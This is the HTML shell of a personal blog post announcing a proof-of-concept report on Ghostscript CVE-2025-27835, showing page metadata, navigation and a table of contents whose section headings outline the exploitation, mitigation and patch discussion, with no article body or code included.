<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>PoC Report of Ghostscript CVE-2025-27835 &middot; Richard&#39;s Blog</title>
  <meta name="title" content="PoC Report of Ghostscript CVE-2025-27835 &middot; Richard&#39;s Blog" />
  
  <meta name="description" content="a description" />
  <meta name="keywords" content="Ghostscript, " />
  
  
  <link rel="canonical" href="http://localhost:1313/posts/1750992676979-poc-report-of-ghostscript-cve-2025-27835/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.e4a694b744929a759a0c151321fd6ff5de4ee3b4bfe86bbcbc00eca8690e25cc68e0a260316dcec6b6b419ada9c851205633ce9ff6bc7c630088b448f3320ba7.css"
    integrity="sha512-5KaUt0SSmnWaDBUTIf1v9d5O47S/6Gu8vADsqGkOJcxo4KJgMW3Oxra0Ga2pyFEgVjPOn/a8fGMAiLRI8zILpw==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.dc15078f1fe553ce354f85ec1bfce7ded8b4060d4124a49b19e31dd64345b8d8f03edbbb1b681748650181f9d81da9728ca10c2b9cb2ae7bf8983d4b669ba876.js"
    integrity="sha512-3BUHjx/lU841T4XsG/zn3ti0Bg1BJKSbGeMd1kNFuNjwPtu7G2gXSGUBgfnYHalyjKEMK5yyrnv4mD1LZpuodg==" data-copy="Copy" data-copied="Copied"></script>
  
  
  
  <script src="/lib/zoom/zoom.min.f592a181a15d2a5b042daa7f746c3721acf9063f8b6acd175d989129865a37d400ae0e85b640f9ad42cd98d1f8ad30931718cf8811abdcc5fcb264400d1a2b0c.js" integrity="sha512-9ZKhgaFdKlsELap/dGw3Iaz5Bj&#43;Las0XXZiRKYZaN9QArg6FtkD5rULNmNH4rTCTFxjPiBGr3MX8smRADRorDA=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="http://localhost:1313/posts/1750992676979-poc-report-of-ghostscript-cve-2025-27835/">
  <meta property="og:site_name" content="Richard&#39;s Blog">
  <meta property="og:title" content="PoC Report of Ghostscript CVE-2025-27835">
  <meta property="og:description" content="a description">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-05-10T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-05-10T00:00:00+00:00">
    <meta property="article:tag" content="Ghostscript">
    <meta property="og:image" content="http://localhost:1313/posts/1750992676979-poc-report-of-ghostscript-cve-2025-27835/featured.webp">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/1750992676979-poc-report-of-ghostscript-cve-2025-27835/featured.webp">
  <meta name="twitter:title" content="PoC Report of Ghostscript CVE-2025-27835">
  <meta name="twitter:description" content="a description">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "PoC Report of Ghostscript CVE-2025-27835",
    "headline": "PoC Report of Ghostscript CVE-2025-27835",
    "description": "a description",
    
    "inLanguage": "en",
    "url" : "http:\/\/localhost:1313\/posts\/1750992676979-poc-report-of-ghostscript-cve-2025-27835\/",
    "author" : {
      "@type": "Person",
      "name": "Richard Guizar"
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-05-10T00:00:00\u002b00:00",
    "datePublished": "2025-05-10T00:00:00\u002b00:00",
    
    "dateModified": "2025-05-10T00:00:00\u002b00:00",
    
    "keywords": ["Ghostscript"],
    
    "mainEntityOfPage": "true",
    "wordCount": "5585"
  }]
  </script>


  
  
  <meta name="author" content="Richard Guizar" />
  
  
  
  
  <link href="https://github.com/r-guizar" rel="me" />
  
  
  
  
  <link href="https://www.linkedin.com/in/richard-guizar-2830072a3/" rel="me" />
  
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>






















  
  




  
  
  
  
  <meta name="theme-color"/>
  
  

  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content"
        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
      >
    </div>
    
    
      <div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-index-100">
  <div
    id="menu-blur"
    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
  <div class="relative max-w-[64rem] ml-auto mr-auto">
    <div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 padding-main-menu">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">Richard&rsquo;s Blog</a>
            

        </nav>
        <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">

            
            
            
  <a
  href="/posts/"
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Posts">
    Posts
  </p>
</a>



            
            
  <a
  href="https://github.com/r-guizar"
  target="_blank"
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
    <span >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


    </span>
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



            
            
  <a
  href="https://www.linkedin.com/in/richard-guizar-2830072a3/"
  target="_blank"
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
    <span >
      

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>

  </span>


    </span>
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



            
            
  <a
  href=""
  
  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class=" flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 padding-top-[5px]">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
  <a
    href="/posts/"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Posts">
      Posts
    </p>
  </a>
</li>




                    

                    
  <li class="mt-1">
  <a
    href="https://github.com/r-guizar"
    
      target="_blank"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
      <div >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


      </div>
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>




                    

                    
  <li class="mt-1">
  <a
    href="https://www.linkedin.com/in/richard-guizar-2830072a3/"
    
      target="_blank"
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
      <div >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>

  </span>


      </div>
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>




                    

                    
  <li class="mt-1">
  <a
    href=""
    
    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>




                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>




<script>
    (function () {
        var $mainmenu = $('.main-menu');
        var path = window.location.pathname;
        $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
            $(e).children('p').addClass('active');
        });
    })();
</script>


  </div>
</div>


<script
  type="text/javascript"
  src="/js/background-blur.min.4812321520cc2e4cd52bf9137015a55bb6c0b5e66a6b2c96b8654c0ec99be59e8e6425dd838a6fd9bac54000586f37f4a9680bbefaa2aee4601a69e188005cf6.js"
  integrity="sha512-SBIyFSDMLkzVK/kTcBWlW7bAteZqayyWuGVMDsmb5Z6OZCXdg4pv2brFQABYbzf0qWgLvvqiruRgGmnhiABc9g=="
  data-target-id="menu-blur"></script>

    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  


  <article>
    
      
      
      
      
        
    
      <div
        class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom"
        style="background-image:url(/posts/1750992676979-poc-report-of-ghostscript-cve-2025-27835/featured_hu_ae3e957bffe36dfa.webp);"></div>
    
  
      
    


    <header id="single_header" class="mt-5 max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="hidden">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
      >Richard&#39;s Blog</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="hidden">
    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/posts/1750992676979-poc-report-of-ghostscript-cve-2025-27835/"
      >PoC Report of Ghostscript CVE-2025-27835</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        PoC Report of Ghostscript CVE-2025-27835
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  

  
  
    
  

  
    
  

  

  

  

  

  

  

  

  
    
  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-05-10T00:00:00&#43;00:00">10 May 2025</time><span class="px-2 text-primary-500">&middot;</span>



<script
  type="text/javascript"
  src="/js/zen-mode.min.2a0a1375509c03daf41c53a9831aa2d560895b7a2528c3eb3b56e7b11a135c7529e49727162a053b6193be8340270a8342f42c69f3d7e262ae54bc248eaac8f5.js"
  integrity="sha512-KgoTdVCcA9r0HFOpgxqi1WCJW3olKMPrO1bnsRoTXHUp5JcnFioFO2GTvoNAJwqDQvQsafPX4mKuVLwkjqrI9Q=="></script>

<span class="mb-[2px]">
  <span
    id="zen-mode-button"
    class="text-lg hover:text-primary-500"
    title="Enable zen mode"
    data-title-i18n-disable="Enable zen mode"
    data-title-i18n-enable="Disable zen mode">
    <span class="inline-block align-text-bottom">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
</svg>
  </span>

</span>
  </span>
</span>

    

    
    
  </div>

  

  
  
    <div class="flex flex-row flex-wrap items-center">
      
        
      
        
          
        
      
        
      
        
          
            
              <span
                class="mr-2 margin-top-[0.5rem]"
                onclick="window.open(&#34;/tags/ghostscript/&#34;,'_self');return false;">
                <span class="flex cursor-pointer">
  <span
    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Ghostscript
  </span>
</span>

              </span>
            
          
        
      
    </div>
  

  
  



      </div>

      
      
      
      
      

      

      

        

        

        

      

    </header>

    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
        <div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
          <div
            class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]
            
            ">
            
              <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#goal">Goal</a></li>
    <li><a href="#exploit">Exploit</a></li>
    <li><a href="#triggering-conditions">Triggering Conditions</a></li>
    <li><a href="#proof-of-concept-exploit">Proof of Concept Exploit</a></li>
    <li><a href="#ghostscript-internals">Ghostscript Internals</a></li>
    <li><a href="#exploitation">Exploitation</a>
      <ul>
        <li><a href="#global-variable-setup">Global Variable Setup</a></li>
        <li><a href="#main-set-up">Main Set Up</a>
          <ul>
            <li><a href="#font-creation">Font Creation</a></li>
            <li><a href="#full-font-definition-code">Full Font Definition Code</a></li>
            <li><a href="#font-usage">Font Usage</a></li>
            <li><a href="#triggering-the-exploit">Triggering the Exploit</a></li>
          </ul>
        </li>
        <li><a href="#the-exploit">The Exploit</a>
          <ul>
            <li><a href="#done-function-type-confusion-for-arbitrary-reads-and-writes">/DONE Function: Type Confusion For Arbitrary Reads and Writes</a></li>
            <li><a href="#disabling-the-security-flags">Disabling the security flags</a></li>
          </ul>
        </li>
        <li><a href="#next-steps">Next Steps</a></li>
      </ul>
    </li>
    <li><a href="#impact">Impact</a></li>
    <li><a href="#mitigations">Mitigations</a>
      <ul>
        <li><a href="#ghostscript-v10051-official-patch">GhostScript v10.05.1 Official Patch</a></li>
      </ul>
    </li>
    <li><a href="#references">References</a></li>
    <li><a href="#full-proof-of-concept-code">Full Proof of Concept Code</a></li>
  </ul>
</nav>
  </div>
</details>
